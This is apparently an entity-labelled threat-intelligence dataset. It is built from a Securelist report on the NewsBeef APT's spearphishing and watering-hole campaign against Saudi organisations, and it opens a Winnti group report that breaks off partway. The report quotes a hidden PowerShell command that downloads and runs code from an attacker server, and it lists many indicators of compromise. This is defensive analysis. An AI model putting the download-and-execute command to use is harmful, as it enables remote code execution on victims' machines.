https://www.virustotal.com/gui/file/28ebfe86217ed36ead5b429cadcd005338a0ae6207119729b53698b5e4a3ef3f/detection
https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting
https://securelist.com/freezer-paper-around-free-meat/74503/


",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 2/13

Executive summary

The ",O
Twas the night before,NewsBeef APT,threat_actor
Twas the night before," previously engaged in long-term, elaborate social engineering
schemes that take advantage of popular social network platforms. Previous analysis of
the ",O
Twas the night before,NewsBeef APT,threat_actor
Twas the night before, indicates that the group focuses on Saudi Arabian (,O
Twas the night before,SA,country
Twas the night before,") and Western
targets, and lacks advanced offensive technology development capabilities.

In previous campaigns, ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," relied heavily on its namesake technology, the
",O
Twas the night before,Browser Exploitation Framework,technique
Twas the night before, (,O
Twas the night before,BeEF,technique
Twas the night before,"). However, in the ",O
Twas the night before,summer of 2016,timestamp
Twas the night before,", the group
deployed a new toolset that includes macro-enabled ",O
Twas the night before,Office,software
Twas the night before," documents, ",O
Twas the night before,PowerSploit,malware
Twas the night before,", and
the ",O
Twas the night before,Pupy,malware
Twas the night before, backdoor. The most recent ,O
Twas the night before,NewsBeef,threat_actor
Twas the night before," campaign uses this toolset in
conjunction with ",O
Twas the night before,spearphishing emails,technique
Twas the night before,", ",O
Twas the night before,"links sent over social media/standalone private
messaging applications",technique
Twas the night before,", and ",O
Twas the night before,watering hole attacks,technique
Twas the night before," that leverage compromised high-
profile websites (some belonging to the ",O
Twas the night before,SA government,org
Twas the night before,"). The group changed multiple
characteristics year over year – tactics, the malicious ",O
Twas the night before,JavaScript,software
Twas the night before," injection strategically
placed on compromised websites, and command and control C2 infrastructure. 

In a nutshell:

The ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," actor deployed a new toolset in a campaign that focused primarily
on Saudi Arabian targets;
",O
Twas the night before,BeEF,technique
Twas the night before," does not appear to be deployed as a part of the current campaign;
Compromised government and infrastructure-related websites are injected with
",O
Twas the night before,JavaScript,software
Twas the night before," that geolocates and redirects visitors to spoofed, attacker-controlled
web-servers;
Improvements in ",O
Twas the night before,JavaScript,software
Twas the night before," injection and obfuscation may extend server
persistence;
",O
Twas the night before,NewsBeef,threat_actor
Twas the night before, continues to deploy malicious macro-enabled ,O
Twas the night before,Office,software
Twas the night before," documents,
poisoned legitimate ",O
Twas the night before,Flash,software
Twas the night before, and ,O
Twas the night before,Chrome,software
Twas the night before," installers, ",O
Twas the night before,PowerSploit,malware
Twas the night before,", and ",O
Twas the night before,Pupy,malware
Twas the night before," tools

Technical Analysis

The ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," campaign is divided into two main attack vectors, ",O
Twas the night before,spearphishing,technique
Twas the night before," and
strategic web compromise (",O
Twas the night before,watering hole,technique
Twas the night before,") attacks. The group’s spearphishing
component uses malicious, macroenabled, ",O
Twas the night before,Microsoft Office,software
Twas the night before," documents that deliver
PowerShell scripts. The scripts download poisoned installers (e.g. ",O
Twas the night before,Flash,software
Twas the night before,", ",O
Twas the night before,Citrix Client,software
Twas the night before,",
and ",O
Twas the night before,Chrome,software
Twas the night before,") from an online presence (in at least one case, the group spoofed a
legitimate, well-known IT services organization). Once the installer is downloaded to a
victim machine, it runs ",O
Twas the night before,PowerSploit,malware
Twas the night before," scripts that in turn download and execute a full-
featured ",O
Twas the night before,Pupy,malware
Twas the night before," backdoor.

On ",O
Twas the night before,"December 25, 2016",timestamp
Twas the night before,", the ",O
Twas the night before,NewsBeef APT,threat_actor
Twas the night before," stood up a server to host a new set of
",O
Twas the night before,Microsoft Office,software
Twas the night before," documents (maintaining malicious macros and PowerShell scripts) to
support its spear-phishing operations. The group sent these documents (or links to them)
to targets via email, and over social network and standalone messaging clients.

To compromise websites and servers, the group identified vulnerable sites and injected
obfuscated ",O
Twas the night before,JavaScript,software
Twas the night before, that redirected visitors to ,O
Twas the night before,NewsBeef,threat_actor
Twas the night before,"-controlled hosts (which
tracked victims and served malicious content). These compromised servers include



",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 3/13

",O
Twas the night before,Saudi Arabian government,org
Twas the night before," servers and other high-value organizational identities
relevant to their targets.

Targets, social engineering, delivery chain

The majority of ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before, targets that our researchers have observed are located in ,O
Twas the night before,SA,country
Twas the night before,".
Targeting profiles include:

Government financial and administrative organizations
Government health organizations
Engineering and technical organizations
One British labor related government organization (targeted multiple times)

The bulk of the targets were affected through strategic web compromises, especially via
compromised government servers. However, ",O
Twas the night before,Kaspersky Security Network,software
Twas the night before, (,O
Twas the night before,KSN,software
Twas the night before,") records
also contain links that victims clicked from the ",O
Twas the night before,Outlook,software
Twas the night before," web client “outlook.live.com” as
well as attachments arriving through the ",O
Twas the night before,Outlook,software
Twas the night before," desktop application. This behavior falls
in line with previous ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," operations, where the group used other standalone
messaging clients to send malicious links. Interestingly, ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," set up its server using
the hosting provider “",O
Twas the night before,"Choopa, LLC, US",org
Twas the night before,"”, the same hosting provider that the group used
in attacks over the ",O
Twas the night before,summer of 2016,timestamp
Twas the night before,".

The domain “",O
Twas the night before,ntg-sa[.]com,ioc
Twas the night before,"” appears to
be an attempt by the ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," actor
to spoof the legitimate Saudi IT services organization, “",O
Twas the night before,National Technology Group,org
Twas the night before,” (,O
Twas the night before,NTG,org
Twas the night before,") at,
“",O
Twas the night before,ntg.com[.]sa,ioc
Twas the night before,"”. The malicious
documents served at the spoofed
website are shown below:

https://securelist.com/twas-the-night-before/91599/ipdomain/


",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 4/13

",O
Twas the night before,NTG,org
Twas the night before, is a legitimate company that provides IT services and support to ,O
Twas the night before,SA government,org
Twas the night before,"
organizations and communications firms (as well as international financial groups and
retailers), making it a high-value identity. Spoofing the identity of an IT service provider is
a particularly important asset to threat actors that can abuse the inherent trust of IT
organizations to push software (which may appear suspicious if served from another
source). ",O
Twas the night before,NTG,org
Twas the night before,’s IT focus and client list likely aided ,O
Twas the night before,NewsBeef,threat_actor
Twas the night before,"’s delivery of malicious
PowerShell-enabled Office documents and poisoned installers.

https://securelist.com/twas-the-night-before/91599/ntgsa/


",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 5/13

In ",O
Twas the night before,December 2016,timestamp
Twas the night before,", the following active URLs were served from the spoofed ",O
Twas the night before,NTG,org
Twas the night before,"
identity. All of the poisoned installers are technologies that an IT support service may be
expected to deliver.

",O
Twas the night before,hxxps://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe,ioc
Twas the night before,"
",O
Twas the night before,hxxps://ntg-sa[.]com/Downloads/Citrix_Certificate.exe,ioc
Twas the night before,"
",O
Twas the night before,hxxps://ntg-sa[.]com/Downloads/Chrome_Update.exe,ioc
Twas the night before,"

In this scenario, the poisoned ",O
Twas the night before,Flashplayer,software
Twas the night before,", ",O
Twas the night before,Citrix,software
Twas the night before,", or ",O
Twas the night before,Chrome,software
Twas the night before," installer drops the file
“",O
Twas the night before,install.bat,ioc
Twas the night before,"”. The batch file runs the PowerShell command:

powershell.exe -w hidden -noni -nop -c “iex(New-Object
System.Net.WebClient).DownloadString(‘http://139.59.46[.]154:3485/eiloShaegae1′)

The command downloads “eiloShaegae1”, another PowerShell downloader script. This
second PowerShell downloader script downloads and runs the payload; a ",O
Twas the night before,PowerSploit,malware
Twas the night before,"
ReflectivePEInjection script, “",O
Twas the night before,hxxp://139.59.46[.]154:3485/IMo8oosieVai,ioc
Twas the night before,"”.

The script maintains and then decodes a base64 string. This base64 string, is the ",O
Twas the night before,Pupy,malware
Twas the night before,"
backdoor DLL, which is loaded and run in-memory, never touching the disk. This ",O
Twas the night before,Pupy,malware
Twas the night before,"
backdoor immediately communicates with ",O
Twas the night before,139.59.46[.1]54,ioc
Twas the night before," over obfs3, posting collected
system data and retrieving commands.

This selection of “The Threebfuscator” for command and control (C2) communications is
interesting, because it is an obfuscating protocol used to mask Tor communications. It is
possible that the use of obfs3 indicates the attackers’ understanding of its effectiveness
against outbound connection monitoring.

Another notable spoofed domain used during this campaign is the “",O
Twas the night before,maps-modon[.]club,ioc
Twas the night before,"”
domain. The domain “",O
Twas the night before,maps.modon.gov[.]sa,ioc
Twas the night before,” was compromised in ,O
Twas the night before,December 2016,timestamp
Twas the night before,", and
the “",O
Twas the night before,maps-modon[.]club,ioc
Twas the night before,” domain created on ,O
Twas the night before,"December 8, 2016",timestamp
Twas the night before,". The domain shared the

https://securelist.com/twas-the-night-before/91599/ntgsa_home/


",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 6/13

same IP address (",O
Twas the night before,45.76.32[.]252,ioc
Twas the night before,) as “,O
Twas the night before,ntg-sa[.]com,ioc
Twas the night before,"”. Although we did not observe any
malicious documents retrieved from that domain, it is likely that the domain served the
same documents as ",O
Twas the night before,ntg-sa[.]com,ioc
Twas the night before,. The filenames of the malicious ,O
Twas the night before,Office,software
Twas the night before," documents
(hosted at the spoofed ",O
Twas the night before,NTG,org
Twas the night before," site) are relevant to typical IT and contracting resources and
indicate that this scheme relies on effective social engineering tactics related to human
resources and IT activities.

In other schemes, the attackers sent
macro-enabled ",O
Twas the night before,Office,software
Twas the night before," attachments
from spoofed law firm identities (or
other relevant service providers) to
targets in ",O
Twas the night before,SA,country
Twas the night before,". The law firm in this
scheme is based in the ",O
Twas the night before,United Kingdom,country
Twas the night before," and is the sole location for
targets outside of ",O
Twas the night before,SA,country
Twas the night before," for this campaign.
Below is a screenshot of a fake legal
proposal in ",O
Twas the night before,Word,software
Twas the night before," doc format,
containing malicious macros and
PowerShell code.

The malicious document follows the same chain as the poisoned ",O
Twas the night before,Flash player,software
Twas the night before, or ,O
Twas the night before,Chrome Installer,software
Twas the night before,":

https://securelist.com/twas-the-night-before/91599/spears/
https://securelist.com/twas-the-night-before/91599/lawspear/


",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 7/13

Compromised servers and injected ",O
Twas the night before,JavaScript,software
Twas the night before,"

Starting in ",O
Twas the night before,October 2016,timestamp
Twas the night before,", ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," compromised a set of legitimate servers (shown
below), and injected ",O
Twas the night before,JavaScript,software
Twas the night before, to redirect visitors to ,O
Twas the night before,hxxp://analytics-google[.]org:69/Check.aspx:,ioc
Twas the night before,"

The entire list of compromised servers
is exclusively Saudi Arabian, and
includes organizations from the
following industries:

Energy services for industrial
processes
",O
Twas the night before,"Telecom engineering and
implementation services",industry
Twas the night before,"
",O
Twas the night before,Shipping and logistics,industry
Twas the night before,"
",O
Twas the night before,Metal engineering and manufacturing,industry
Twas the night before,"
",O
Twas the night before,Information technology services,industry
Twas the night before,"
",O
Twas the night before,Cement and building materials,industry
Twas the night before,"

These recent attacks against
legitimate servers (when compared to previous ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," activity) indicate that
",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," operators have improved their technical skills, specifically their ability to
covertly inject ",O
Twas the night before,JavaScript,software
Twas the night before," code into served web pages. Their injection and obfuscation
techniques enable the actor to serve the same ",O
Twas the night before,JavaScript,software
Twas the night before," with every page visit to the
“",O
Twas the night before,watering hole,technique
Twas the night before,"” site as well as increase the difficulty of identifying the malicious
",O
Twas the night before,JavaScript,software
Twas the night before," source on compromised sites.

For example, on a ",O
Twas the night before,Saudi government,org
Twas the night before," website, the ",O
Twas the night before,NewsBeef APT,threat_actor
Twas the night before," delivered packed
",O
Twas the night before,JavaScript,software
Twas the night before," into the bottom of a referenced script that is included in every page served
from the site (the packed and unpacked ",O
Twas the night before,JavaScript,software
Twas the night before, is shown below). The ,O
Twas the night before,JavaScript,software
Twas the night before,"
forces visiting web browsers to collect and send (via a POST request) web browser,
browser version, country of origin, and IP address data to the attacker controlled server
“",O
Twas the night before,jquerycodedownload[.]live/check.aspx,ioc
Twas the night before,"”.

It is likely that this collection of visitor information represents an attempt to limit the
number of infections to a specific target subset and reduce the attacker’s operational
footprint. Although we did not identify injected ",O
Twas the night before,JavaScript,software
Twas the night before, related to the “,O
Twas the night before,"analytics-
google[.]org/check.aspx",ioc
Twas the night before,"” redirections, it is likely that it performed similar data collection

https://securelist.com/twas-the-night-before/91599/pupychain/
https://securelist.com/twas-the-night-before/91599/compromisedservers1/


",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 8/13

and exfiltration (via POST). This technique appears to be an improvement over the
simple .JPG beaconing which researchers observed in previous ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before, ,O
Twas the night before,watering hole attacks,technique
Twas the night before,. Packed ,O
Twas the night before,JavaScript,software
Twas the night before,":

The most trafficked of the compromised sites (which redirect to “",O
Twas the night before,"jquerycode-
download[.]live",ioc
Twas the night before,”) appears to be the government site at “,O
Twas the night before,scsb.gov[.]sa/portal/,ioc
Twas the night before,"”. A high
volume of redirections from the compromised site continues into ",O
Twas the night before,mid-January 2017,timestamp
Twas the night before,".

https://securelist.com/twas-the-night-before/91599/packedjs/
https://securelist.com/twas-the-night-before/91599/unpacked/


",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 9/13

Below is a list of compromised websites and the associated URL that serves the
injected, second layer ",O
Twas the night before,JavaScript,software
Twas the night before,. Note that the ,O
Twas the night before,JavaScript,software
Twas the night before," resource changes on every
compromised website among many other referenced ",O
Twas the night before,JavaScript,software
Twas the night before," sources, making it
difficult to track down the source of the malicious script per site:

",O
Twas the night before,www.taqa.com[.]sa/Scroll-jquery.js,ioc
Twas the night before,"

https://securelist.com/twas-the-night-before/91599/taqa/


",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 10/13

",O
Twas the night before,199099.gov[.]sa/_LAYOUTS/Yesser.NCC/js/jquery-1.7.2.min.js,ioc
Twas the night before,"

Multiple other relevant sites were compromised and redirecting as well.

The ",O
Twas the night before,Pupy,malware
Twas the night before," backdoor

",O
Twas the night before,Pupy,malware
Twas the night before," is an open source, multi-platform (",O
Twas the night before,Windows,software
Twas the night before,", ",O
Twas the night before,Linux,software
Twas the night before,", ",O
Twas the night before,OSX,software
Twas the night before,", ",O
Twas the night before,Android,software
Twas the night before,"), multi-function
backdoor. The backdoor is mainly written in ",O
Twas the night before,Python,software
Twas the night before," and uses code from other open
source attack tools like ",O
Twas the night before,PowerSploit,malware
Twas the night before,", ",O
Twas the night before,Mimikatz,malware
Twas the night before,", ",O
Twas the night before,laZagne,malware
Twas the night before,", etc. ",O
Twas the night before,Pupy,malware
Twas the night before," can generate
backconnect or bindport payloads in multiple formats: PE executables (x86/x64) for
",O
Twas the night before,Windows,software
Twas the night before,", ELF binary/.so for ",O
Twas the night before,Linux,software
Twas the night before,", reflective DLLs (x86/x64), pure ",O
Twas the night before,Python,software
Twas the night before," files,
PowerShell, apk, and Rubber Ducky script (",O
Twas the night before,Windows,software
Twas the night before,").

The malicious DLL deployed by ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before, contains ,O
Twas the night before,Python,software
Twas the night before," code, a ",O
Twas the night before,Python,software
Twas the night before," interpreter,
and the MSVC runtime library as well as code that loads the ",O
Twas the night before,Python,software
Twas the night before," interpreter, runs
",O
Twas the night before,Python,software
Twas the night before, code and exports some functions for ,O
Twas the night before,Python,software
Twas the night before,". A configuration string contains
base64-encoded ",O
Twas the night before,Python,software
Twas the night before," code (packed with zlib) with transport configuration and
information about C2 server addresses.

When initiated, the ",O
Twas the night before,Python,software
Twas the night before," code attempts to retrieve and use SOCKS/HTTP proxy
settings from the victim’s computer. The ",O
Twas the night before,Python,software
Twas the night before," code then tries to initiate a reverse
connection to the C2 server (",O
Twas the night before,139.59.46[.]154:3543,ioc
Twas the night before,") using a TCP protocol with RSA+AES
traffic encryption and obfs3 transport using default keys from ",O
Twas the night before,Pupy,malware
Twas the night before," sources.

https://securelist.com/twas-the-night-before/91599/199099gov/


",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 11/13

After a successful connection, ",O
Twas the night before,NewsBeef,threat_actor
Twas the night before, ,O
Twas the night before,Pupy,malware
Twas the night before," sends information about the infected
computer and waits for commands (which take the form of modules) from the C2 server.
The C2 server can send modules with ",O
Twas the night before,Python,software
Twas the night before, code and compiled ,O
Twas the night before,Python,software
Twas the night before," C extensions.
The main functionality of the backdoor is implemented in packages (",O
Twas the night before,Python,software
Twas the night before," code,
compiled ",O
Twas the night before,Python,software
Twas the night before," C extensions, compiled executable files) and modules (",O
Twas the night before,Python,software
Twas the night before," code).
Modules can directly access ",O
Twas the night before,Python,software
Twas the night before," objects on the remote client using the RPyC
module. The ",O
Twas the night before,Python,software
Twas the night before," modules win32com, win32api, and ctypes are used to interact with
the Win32 API. Attackers can use standard modules or write their own. All modules are
executed in the memory (a ",O
Twas the night before,Pupy,malware
Twas the night before," process can migrate between processes using the
corresponding module).

Conclusion
Previous reports on the ",O
Twas the night before,NewsBeef APT,threat_actor
Twas the night before," noted the group’s reliance on open-source tools
to launch simple, yet effective attacks. Historically, the group has used ",O
Twas the night before,BeEF,technique
Twas the night before," to track
targets and deliver malicious payloads. However, as this recent campaign indicates, the
",O
Twas the night before,NewsBeef APT,threat_actor
Twas the night before, appears to have shifted its intrusion toolset away from ,O
Twas the night before,BeEF,technique
Twas the night before," and
towards macro-enabled malicious ",O
Twas the night before,Office,software
Twas the night before," documents, ",O
Twas the night before,PowerSploit,malware
Twas the night before,", and ",O
Twas the night before,Pupy,malware
Twas the night before,". Despite
this shift in toolset, the group still relies on old infrastructure as evidenced by their reuse
of servers hosted by the service providers ",O
Twas the night before,Choopa,org
Twas the night before, and ,O
Twas the night before,Atlantic.net,org
Twas the night before,".

The improvements in tactics, techniques and procedures appears to have paid off. The
most recent campaign indicates that the group was able to compromise a larger number
of sites including valuable, high-profile ",O
Twas the night before,SA government,org
Twas the night before," identities. However, despite these
improvements in technology, the ",O
Twas the night before,NewsBeef APT,threat_actor
Twas the night before," continues to rely on social engineering
schemes and open-source tools – attributes that increase the chances of identification.

",O
Twas the night before,NewsBeef,threat_actor
Twas the night before," attacks against Saudi Arabian organizations and individuals (as well as
targets in the European Union) are likely to continue. Additionally, researchers expect
that as the group evolves, its tasking will expand to other organizations doing business
with, or connected to Saudi Arabian organizations and individuals.

Due to the group’s specific target set, it is crucial that ",O
Twas the night before,SA,country
Twas the night before," security teams, administrators,
and developers (especially web application administrators/developers) update their
",O
Twas the night before,WordPress,software
Twas the night before,", ",O
Twas the night before,Joomla,software
Twas the night before,", and ",O
Twas the night before,Drupal,software
Twas the night before,"-based web applications and plugins – as these assets
are actively scanned and exploited by this ",O
Twas the night before,APT,threat_actor
Twas the night before,".

Appendix

Related Object MD5 (executable code, malicious office
documents, ",O
Twas the night before,JavaScript,software
Twas the night before,", powershell, etc)

",O
Twas the night before,f4d18316e367a80e1005f38445421b1f,ioc
Twas the night before,"
",O
Twas the night before,638b74a712a7e45efc9bec126b0f2d87,ioc
Twas the night before,"
",O
Twas the night before,45b0e5a457222455384713905f886bd4,ioc
Twas the night before,"
",O
Twas the night before,19cea065aa033f5bcfa94a583ae59c08,ioc
Twas the night before,"
",O
Twas the night before,ecfc0275c7a73a9c7775130ebca45b74,ioc
Twas the night before,"



",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

https://securelist.com/twas-the-night-before/91599/ 12/13

",O
Twas the night before,1b5e33e5a244d2d67d7a09c4ccf16e56,ioc
Twas the night before,"
",O
Twas the night before,fa72c068361c05da65bf2117db76aaa8,ioc
Twas the night before,"
",O
Twas the night before,43fad2d62bc23ffdc6d301571135222c,ioc
Twas the night before,"
",O
Twas the night before,ce25f1597836c28cf415394fb350ae93,ioc
Twas the night before,"
",O
Twas the night before,03ea9457bf71d51d8109e737158be888,ioc
Twas the night before,"
",O
Twas the night before,edfc37461fa66716b53333fd7f841a8e,ioc
Twas the night before,"
",O
Twas the night before,623e05dd58d86da76fdfcf9b57032168,ioc
Twas the night before,"
",O
Twas the night before,6946836f2feb98d6e8021af6259a02dd,ioc
Twas the night before,"
",O
Twas the night before,f4d18316e367a80e1005f38445421b1f,ioc
Twas the night before,"
",O
Twas the night before,d87663ce6a9fc0e8bc8180937b3566b9,ioc
Twas the night before,"
",O
Twas the night before,f9adf73bf1cdd7cd278e5137d966ddd4,ioc
Twas the night before,"
",O
Twas the night before,b8373f909fa228c2b6e7d69f065f30fb,ioc
Twas the night before,"
",O
Twas the night before,9b1a06590b091d300781d8fbee180e75,ioc
Twas the night before,"
",O
Twas the night before,bcafe408567557289003c79f745f7713,ioc
Twas the night before,"
",O
Twas the night before,45b0e5a457222455384713905f886bd4,ioc
Twas the night before,"
",O
Twas the night before,83be35956e5d409306a81e88a1dc89fd,ioc
Twas the night before,"
",O
Twas the night before,c2165155fcba5b737ee70354b5244be3,ioc
Twas the night before,"
",O
Twas the night before,444c93e736194a01bf3b319e3963d746,ioc
Twas the night before,"
",O
Twas the night before,0ed61b6f1008000c6dfcd3d842b21971,ioc
Twas the night before,"
",O
Twas the night before,3fb33a2747b39a9b1c5c1e41fade595e,ioc
Twas the night before,"
",O
Twas the night before,b34fd14105be23480c44cfdf6eb26807,ioc
Twas the night before,"

URLs

Hosting malicious docs, executables, PowerShell and ",O
Twas the night before,Pupy,malware
Twas the night before," backdoors

",O
Twas the night before,moh.com-ho[.]me/Health_insurance_plan.doc,ioc
Twas the night before,"
",O
Twas the night before,moh.com-ho[.]me/Health_insurance_registration.doc,ioc
Twas the night before,"
",O
Twas the night before,mol.com-ho[.]me/cv_itworx.doc,ioc
Twas the night before,"
",O
Twas the night before,mci.com-ho[.]me/cv_mci.doc,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/flashplayer23pp_xa_install.exe,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/citrixcertificate.exe,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/chrome_update.exe,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/CitrixReceiver.exe,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/check.aspx,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/CheckLog.aspx,ioc
Twas the night before,"
",O
Twas the night before,https://ntg-sa[.]com/downloads/citrix_certificate.exe,ioc
Twas the night before,"
",O
Twas the night before,https://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe,ioc
Twas the night before,"
",O
Twas the night before,https://ntg-sa[.]com/Downloads/Chrome_Update.exe,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/cv.doc,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/cv_itworx.doc,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/cv_mci.doc,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/discount_voucher_codes.xlsm,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/Health_insurance_plan.doc,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/Health_insurance_registration.doc,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/job_titles.doc,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/job_titles_itworx.doc,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/job_titles_mci.doc,ioc
Twas the night before,"



",O
Twas the night before,7/5/2019,timestamp
Twas the night before, ‘Twas ,O
Twas the night before,the night before,timestamp
Twas the night before," | Securelist

",O
Twas the night before,https://securelist.com/twas-the-night-before/91599/ 13/13,ioc
Twas the night before,"

",O
Twas the night before,http://ntg-sa[.]com/Password_Policy.xlsm,ioc
Twas the night before,"
",O
Twas the night before,45.32.186.33,ioc
Twas the night before,"
",O
Twas the night before,http://itworx.com-ho[.]me/*,ioc
Twas the night before,"
",O
Twas the night before,http://mci.com-ho[.]me/*,ioc
Twas the night before,"
",O
Twas the night before,http://moh.com-ho[.]me/*,ioc
Twas the night before,"
",O
Twas the night before,http://mol.com-ho[.]me/*,ioc
Twas the night before,"
",O
Twas the night before,http://ntg-sa[.]com/*,ioc
Twas the night before,"
",O
Twas the night before,taqa.com[.]sa/arabic/resumes/resume.doc,ioc
Twas the night before,"
",O
Twas the night before,taqa.com[.]sa/arabic/resumes/resume.doc,ioc
Twas the night before,"
",O
Twas the night before,taqa.com[.]sa/arabic/resumes/cv-taqa.doc,ioc
Twas the night before,"
",O
Twas the night before,taqa.com[.]sa/arabic/images/certificate.crt.exe,ioc
Twas the night before,"
",O
Twas the night before,taqa.com[.]sa/arabic/tempdn/cv-taqa.doc,ioc
Twas the night before,"
",O
Twas the night before,104.218.120[.]128/pro.bat,ioc
Twas the night before,"
",O
Twas the night before,104.218.120[.]128/msservice-a-2.exe,ioc
Twas the night before,"
",O
Twas the night before,104.218.120[.]128/msservice-a-4.exe,ioc
Twas the night before,"
",O
Twas the night before,104.218.120[.]128/check.aspx,ioc
Twas the night before,"
",O
Twas the night before,104.218.120[.]128:69/checkFile.aspx,ioc
Twas the night before,"
",O
Twas the night before,139.59.46[.]154/IMo8oosieVai,ioc
Twas the night before,"
",O
Twas the night before,139.59.46[.]154:3485/eiloShaegae1,ioc
Twas the night before,"
",O
Twas the night before,69.87.223[.]26/IMo8oosieVai,ioc
Twas the night before,"
",O
Twas the night before,69.87.223[.]26:8080/eiloShaegae1,ioc
Twas the night before,"
",O
Twas the night before,69.87.223[.]26:8080/p,ioc
Twas the night before,"

Additional C2

",O
Twas the night before,analytics-google[.]org:69/check.aspx,ioc
Twas the night before,"
",O
Twas the night before,analytics-google[.]org/checkFile.aspx,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/check.aspx,ioc
Twas the night before,"
",O
Twas the night before,jquerycode-download[.]live/checkFile.aspx,ioc
Twas the night before,"
",O
Twas the night before,go-microstf[.]com/checkFile.aspx,ioc
Twas the night before,"
",O
Twas the night before,104.218.120[.]128/check.aspx,ioc
Twas the night before,"
",O
Twas the night before,104.218.120[.]128:69/checkFile.aspx,ioc
WINNTI GROUP_ Insights From the Past,4/21/2020 ,O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://iuointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 1/13

April 20, 2020

",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," GROUP: Insights From the Past
quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past

Newly uncovered DNS tunnelling technique, and new
campaign against South Korean gaming company

Executive Summary
In ",O
WINNTI GROUP_ Insights From the Past,January 2020,timestamp
WINNTI GROUP_ Insights From the Past,", ",O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past, (,O
WINNTI GROUP_ Insights From the Past,QuoINT,org
WINNTI GROUP_ Insights From the Past,) detected a new ,O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample uploaded to a
public virus scanner from a German location. Following our preliminary analysis, we
assessed with high confidence that the sample was used to target
a previously unreported German chemical company. As part of our responsible disclosure,
we alerted the affected entity, the local Law Enforcements, and our clients.
In the following weeks after our internal reporting, the German news media source
",O
WINNTI GROUP_ Insights From the Past,Tagesschau,org
WINNTI GROUP_ Insights From the Past," reported our initial detection and analysis of the sample, and confirmed the
chemical company’s awareness of the attack in ",O
WINNTI GROUP_ Insights From the Past,the second half of 2019,timestamp
WINNTI GROUP_ Insights From the Past,".
The ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample we analysed was highly likely developed in 2015, and likely used
around this year for the first time, it is unclear how long the compromise existed in the
compromised environment.
Although the malware was likely used years ago, further analysis revealed a previously
unreported C2 technique never attributed to any ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group’s toolkits.
The technique relies on a DNS Tunneling communication channel through a custom
implementation of the iodine source code, an open-source software that enables the
tunneling of IPv4 data through a DNS server.
Additionally, we uncovered a previously unknown stolen digital certificate being used to
digitally sign ",O
